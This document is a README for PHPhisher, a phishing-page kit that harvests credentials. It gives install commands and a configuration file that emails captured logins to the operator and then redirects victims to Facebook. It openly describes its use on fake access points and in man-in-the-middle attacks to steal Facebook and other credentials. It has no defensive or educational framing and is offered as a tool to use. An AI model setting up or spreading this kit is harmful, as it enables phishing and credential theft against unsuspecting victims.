## About
PHPhisher is a pack of phising pages with an automatic harvesting system.

PHPhisher works on any Linux Distribution (You have to install PHP5, mysql).

## How it works
The tool can be used on a Variety of possible attacks.
Examples:
On a Fake AC in order to gain Facebook or other type of credentials from the victim.
Can work as a Phising platform for a possible MITM attack.

## Installation

```

sudo apt-get update
sudo apt-get upgrade
sudo apt-get install apache2 php5 mysql-server mysql-client

Cloning & Editing the files:
git clone git://github.com/NickTehPro/phphisher PHPhisher 
mv PHPhisher/ /var/www/ 

Apache Setup:

cd ~
cd /etc/apache2/sites-enabled/
nano 000* //Change the location from /var/www/html/ to /var/www/PHPhisher/
service apache2 reload

Permissions:
chmod 777 /var/www/config.json
DONE!
```
After installing everything, edit the configuration file:
```
{
	"page": 0, // The number of the scenario you want to simulate.
	"email": "", //Use an email to send you the harvested credentials. (You need to install postfix for this)
	"page-redirect": "http://facebook.com/", //The page that your victim is going after the attack completes.
	"dbuser": "root", //Self explanatory 
	"dbpass": "phphisher", //Self explanatory 
	"dbname": "phphisher", //Self explanatory 
	"dbip": "localhost" //Self explanatory 
	"dbuse": "1" // 1 = DB 2= Email Still buggy af.
}
```
Point your browser to dbsetup.php in order to create the tables.
